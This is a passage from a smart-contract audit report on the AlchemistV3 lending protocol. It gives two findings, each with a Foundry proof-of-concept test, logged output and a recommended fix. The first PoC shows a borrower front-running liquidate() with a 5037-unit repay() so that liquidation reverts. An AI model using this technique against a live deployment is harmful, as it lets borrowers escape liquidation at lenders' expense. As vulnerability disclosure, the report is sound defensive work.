    uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
    account.earmarked -= earmarkToRemove;  
        
    // SNIP
}
```

A malicious user could front run a `liquidate()` call and pay back just enough so that `convertDebtTokensToYield(account.earmarked)` truncates to 0, which will cause the `liquidate()` transaction to revert. 

Liquidations will revert until 1 - more time elapses and the block.number increments or 2 - another redemption is made so that `account.earmarked` can be incremented above the 1e12 threshold. However, the user can repeat the attack when that happens and `liquidate()` would revert again.

Copy and paste the test suite below into `AlchemistV3_9.t.sol`

Run with the following command: `forge test --fork-url {} --match-test testLiquidateRepayDoS -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";

contract AlchemistV3Test_9 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Token addresses
    TestERC20 fakeUnderlyingToken;
    TestYieldToken fakeYieldToken;
    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Mock the price feed call
    address ETH_USD_PRICE_FEED_MAINNET = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;  // @audit never used anywhere

    // Mock the price feed call
    uint256 ETH_USD_UPDATE_TIME_MAINNET = 3600 seconds;

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens

        fakeUnderlyingToken = new TestERC20(100e6, uint8(6));
        fakeYieldToken = new TestYieldToken(address(fakeUnderlyingToken));
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(fakeUnderlyingToken),
            yieldToken: address(fakeYieldToken),
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(fakeYieldToken),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: address(10),
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(fakeUnderlyingToken), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();

        deal(address(fakeUnderlyingToken), alchemist.alchemistFeeVault(), 10_000e6);

        vm.startPrank(anotherExternalUser);

        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);

        vm.stopPrank();
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(fakeYieldToken), someWhale, whaleSupply);
        deal(address(fakeUnderlyingToken), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), whaleSupply + 100e18);
        vm.stopPrank();
    }

    function testLiquidateRepayDoS() external {
        uint256 amount = 100_000e6; // 100,000 EULER USDC
        deal(address(fakeYieldToken), yetAnotherExternalUser, amount);
        deal(address(fakeYieldToken), address(0xbeef), amount);
        deal(address(fakeYieldToken), anotherExternalUser, amount);

        vm.startPrank(someWhale);
        fakeYieldToken.mint(20_000_000e6, someWhale);
        vm.stopPrank();

        // just ensuring global alchemist collateralization stays above the minimum required for regular liquidations
        // no need to mint anything
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // user 1 deposits + takes a loan
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenIdFor0xBeef, alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization, address(0xbeef));
        vm.stopPrank();

        // user 2 deposits + takes a loan
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, anotherExternalUser, 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
        alchemist.mint(tokenId1, alchemist.totalValue(tokenId1) * FIXED_POINT_SCALAR / minimumCollateralization, anotherExternalUser);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        (uint256 prevCollateral, uint256 prevDebt,) = alchemist.getCDP(tokenIdFor0xBeef);
        uint256 initialVaultSupply = IERC20(address(fakeYieldToken)).totalSupply();
        fakeYieldToken.updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        fakeYieldToken.updateMockTokenSupply(modifiedVaultSupply);

        vm.startPrank(address(0xdad));
        deal(address(alToken), address(0xdad), 5000e18);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 5000e18);
        transmuterLogic.createRedemption(5000e18);
        vm.stopPrank();

        vm.roll(block.number + 10);    // time elapse

        // liquidate user 2 (anotherExternalUser)
        vm.startPrank(externalUser);        
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId1);

        // @audit-info calculation for precision loss
        //   AlchemistV3::_liquidate() - L796
        //   repaidAmountInYield = _forceRepay(accountId, convertDebtTokensToYield(account.earmarked));
        
        // @audit-info need to make convertDebtTokensToYield(earmarked) < 0
        //   convertDebtTokenToYield() will take amount / underlyingConversionFactor 
        //   -> for euler USDC/USDC deployment, underlyingConversionFactory = 1e12
        //   if earmarked < 1e12, convertDebtTokensToYield(earmarked) = 0 
        
        // @audit-info use repay() to make account.earmarked < 1e12
        // for what amount? will 1e12 > account.earmarked - convertYieldTokensToDebt(amount)
        (, , uint256 earmarked1) = alchemist.getCDP(tokenIdFor0xBeef);
        uint256 yieldToDebt = alchemist.convertYieldTokensToDebt(5037);
        console.log("Precision Loss: %s", (1e12 > earmarked1 - yieldToDebt));
        console.log("Amount to repay: 5037\n");

        // user 1 front runs the liquidate() call
        vm.startPrank(address(0xbeef));
        deal(address(fakeYieldToken), address(0xbeef), 1000e6);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), 1000e6);
        alchemist.repay(5_037, tokenIdFor0xBeef);
        vm.stopPrank();
        
        // @audit-info ensure current earmarked value causes precision loss
        (, , earmarked1) = alchemist.getCDP(tokenIdFor0xBeef);
        uint256 forceRepayAmount = alchemist.convertDebtTokensToYield(earmarked1);
        assert(forceRepayAmount == 0);
        
        // vm.roll(block.number + 50);    // time elapse - unblock DoS by incrementing earmarked > 1e12

        // liquidate() call reverts for user 1
        vm.expectRevert(IllegalArgument.selector);
        vm.prank(address(0xdad));
        alchemist.liquidate(tokenIdFor0xBeef);

        (, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
        console.log("Remaining Debt for Token ID 1: %s", debt);
        console.log("Earmarked Debt for Token ID 1: %s", earmarked);
    }
}
```

```solidity
Ran 1 test for src/test/AlchemistV3_9.t.sol:AlchemistV3Test_9
[PASS] testLiquidateRepayDoS() (gas: 2839591)
Logs:
  Precision Loss: true
  Amount to repay: 5037

  Remaining Debt for Token ID 1: 89999995244000000009000
  Earmarked Debt for Token ID 1: 468797564688

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.39s (67.98ms CPU time)

Ran 1 test suite in 2.06s (1.39s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

In `testLiquidateRepayDoS()`, both 0xbeef and anotherExternalUser deposit and mint the exact same amounts - deposit 100K Euler USDC and take loans for 90% of collateral’s worth.

This will bring both 0xbeef’s and anotherExternalUser’s collateralization ratios close to the limit.

The token supply changes which causes both accounts to become liquidatable.

anotherExternalUser gets liquidated - 0xbeef was able to prevent liquidation by front running with `repay()` using only 5037 USDC. 

## Impact

Liquidations can be DoSed temporarily, but repeatedly by a malicious user

## Recommendation

Since `_forceRepay()` is only called from `_liquidate()` , if amount = 0, the function can early return 0, instead of reverting.

## Base fee and surplus fee are handled incorrectly in AlchemistV3::liquidate()

## Summary

The base fee and surplus fee are mistaken for each other in `AlchemistV3::liquidate()`.

## Vulnerability Detail

```solidity
function calculateLiquidation(
        uint256 collateral,
        uint256 debt,
        uint256 targetCollateralization,
        uint256 alchemistCurrentCollateralization,
        uint256 alchemistMinimumCollateralization,
        uint256 feeBps
    ) public pure returns (uint256 grossCollateralToSeize, uint256 debtToBurn, uint256 fee) {
        // SNIP

        // 1) fee is taken from surplus = collateral - debt
        uint256 surplus = collateral > debt ? collateral - debt : 0;
        fee = (surplus * feeBps) / BPS;

        // SNIP
    }
```

In `AlchemistV3::calculateLiquidation()`, the fee that is returned is the surplus fee, which is the fee taken on the excess funds between collateral and debt. 

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
        // SNIP
        
807       if (collateralizationRatio <= collateralizationLowerBound) {
808          uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;
809
810            (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
811                collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
812           );
813
814         uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
815         uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
816           uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
817         debtAmount = adjustedLiquidationAmount;
818         feeInYield = convertDebtTokensToYield(baseFee);
819
820         // update user balance (denominated in yield tokens)
821         account.collateralBalance = account.collateralBalance > adjustedLiquidationAmount ? account.collateralBalance - adjustedLiquidationAmount : 0;
822
823         // Update users debt (denominated in debt tokens)
824         _subDebt(accountId, debtToBurn);
825
826         // send liquidation amount - any fee to the transmuter. the transmuter only accepts yield tokens
827         TokenUtils.safeTransfer(yieldToken, transmuter, adjustedDebtToBurn);
828
829         if (feeInYield > 0) {
830             // send base fee in yield tokens to liquidator
831             TokenUtils.safeTransfer(yieldToken, msg.sender, feeInYield);
832         }
833
834         // excess fee will be sent in underlying token to the liquidator.
835         // since debt token is 1 : 1 with underyling token
836         if (feeBonus > 0) {
837             uint256 vaultBalance = IFeeVault(alchemistFeeVault).totalDeposits();
838             if (vaultBalance > 0) {
839                 feeInUnderlying = vaultBalance > feeBonus ? feeBonus : vaultBalance;
840                 IFeeVault(alchemistFeeVault).withdraw(msg.sender, feeInUnderlying);
841             }
842         }
843     }
844
845     return (debtAmount + repaidAmountInYield, feeInYield, feeInUnderlying);
846    }
```

In `AlchemistV3::_liquidate()`, the surplus fee return value is labeled as `baseFee`. [L810]

This amount is later paid to the liquidator from the `feeVault`. [L829-L832]

In `AlchemistV3::_liquidate()`, the `feeBonus` value is treated as the surplus fee, but it is the base fee because it is the liquidation fee taken from the amount of debt that is being liquidated. [L834-L842]

The liquidator will still receive the correct amount of fees, but the fees will be sent from the incorrect sources and in incorrect tokens.

PoC

Set up: Copy and paste the test suite below into `AlchemistV3_7.t.sol`

❯ `forge test --fork-url {} --match-contract AlchemistV3Test_7 -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";

contract AlchemistV3Test_7 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Token addresses
    TestERC20 fakeUnderlyingToken;
    TestYieldToken fakeYieldToken;
    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Mock the price feed call
    address ETH_USD_PRICE_FEED_MAINNET = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;  // @audit never used anywhere

    // Mock the price feed call
    uint256 ETH_USD_UPDATE_TIME_MAINNET = 3600 seconds;

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens

        fakeUnderlyingToken = new TestERC20(100e6, uint8(6));
        fakeYieldToken = new TestYieldToken(address(fakeUnderlyingToken));
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(fakeUnderlyingToken),
            yieldToken: address(fakeYieldToken),
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(fakeYieldToken),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: address(10),
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(fakeUnderlyingToken), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();

        deal(address(fakeUnderlyingToken), alchemist.alchemistFeeVault(), 10_000e6);

        vm.startPrank(anotherExternalUser);

        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);

        vm.stopPrank();
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(fakeYieldToken), someWhale, whaleSupply);
        deal(address(fakeUnderlyingToken), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), whaleSupply + 100e18);
        vm.stopPrank();
    }

    function testLiquidationFeeMismatch() public {
        uint256 amount = 100_000e6; // 100,000 EULER USDC
        deal(address(fakeYieldToken), yetAnotherExternalUser, amount * 2);
        deal(address(fakeYieldToken), anotherExternalUser, amount);

        vm.startPrank(someWhale);
        fakeYieldToken.mint(20_000_000e6, someWhale);
        vm.stopPrank();

        // just ensureing global alchemist collateralization stays above the minimum required for regular liquidations
        // no need to mint anything
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount * 2);
        alchemist.deposit(amount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // user 1 deposits + takes a loan
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, anotherExternalUser, 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
        alchemist.mint(tokenId1, alchemist.totalValue(tokenId1) * FIXED_POINT_SCALAR / minimumCollateralization, anotherExternalUser);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(fakeYieldToken)).totalSupply();
        fakeYieldToken.updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        fakeYieldToken.updateMockTokenSupply(modifiedVaultSupply);

        vm.startPrank(address(0xdad));
        deal(address(alToken), address(0xdad), 5000e18);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 5000e18);
        transmuterLogic.createRedemption(5000e18);
        vm.stopPrank();

        vm.roll(block.number + 600);    // time elapse

        // liquidate user 1 (anotherExternalUser)
        uint256 preVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));
        uint256 preUserUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(externalUser);
        uint256 preUserYieldBalance = IERC20(fakeYieldToken).balanceOf(externalUser);

        vm.startPrank(externalUser);        
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId1);

        uint256 postVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));
        uint256 postUserUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(externalUser);
        uint256 postUserYieldBalance = IERC20(fakeYieldToken).balanceOf(externalUser);

        console.log("feeInYield: %s", feeInYield);
        console.log("feeInUnderlying", feeInUnderlying);

        console.log("Pre-Liquidate Vault Underlying Balance: %s", preVaultUnderlyingBalance);
        console.log("Post-Liquidate Vault Underlying Balance: %s", postVaultUnderlyingBalance);
        console.log("Pre-Liquidate User Underlying Balance: %s", preUserUnderlyingBalance);
        console.log("Post-Liquidate User Underlying  Balance: %s", postUserUnderlyingBalance);
        console.log("Pre-Liquidate User Yield Balance: %s", preUserYieldBalance);
        console.log("Post-Liquidate User Yield Balance: %s", postUserYieldBalance);
    }
}
```

```solidity
Ran 1 test for src/test/AlchemistV3_7.t.sol:AlchemistV3Test_7
[PASS] testLiquidationFeeMismatch() (gas: 2149942)
Logs:
  feeInYield: 140699807
  feeInUnderlying 10000000000
  Pre-Liquidate Vault Underlying Balance: 10000000000
  Post-Liquidate Vault Underlying Balance: 0
  Pre-Liquidate User Underlying Balance: 0
  Post-Liquidate User Underlying  Balance: 10000000000
  Pre-Liquidate User Yield Balance: 0
  Post-Liquidate User Yield Balance: 140699807

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.15s (46.00ms CPU time)

Ran 1 test suite in 1.50s (1.15s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

In `testLiquidateFeeMismatch()`, `feeInUnderlying` (which is the `baseFee`) is being paid from the `feeVault` while `feeInYield` is paid from AlchemistV3.

This is incorrect, as the `baseFee` should be paid from AlchemistV3, and any excess fees should come from the `feeVault`.

## Impact

Base fee and surplus fee are mishandled, which results in the incorrect amounts being pulled from `feeVault` and `AlchemistV3`

## Recommendation

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
    // SNIP
        
    if (collateralizationRatio <= collateralizationLowerBound) {
        uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;

        (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
            collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
        );

-       uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
+       feeInYield = convertDebtTokensToYield(debtToBurn * liquidatorFee / BPS);
        uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
        uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
        debtAmount = adjustedLiquidationAmount;
-       feeInYield = convertDebtTokensToYield(baseFee);
+       uint256 feeBonus = convertDebtTokensToYield(baseFee);

        // SNIP
     }

     return (debtAmount + repaidAmountInYield, feeInYield, feeInUnderlying);
}
```
